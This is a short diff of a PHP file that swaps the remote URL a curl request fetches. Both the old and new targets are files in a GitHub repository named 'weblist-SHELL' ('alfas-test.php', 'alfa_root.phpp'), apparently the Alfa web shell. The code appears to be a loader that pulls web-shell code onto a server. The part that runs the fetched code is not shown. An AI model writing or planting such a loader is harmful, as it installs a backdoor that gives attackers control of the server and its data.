@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfas-test.php";
+$url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/alfa_root.phpp";
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_HEADER, true);
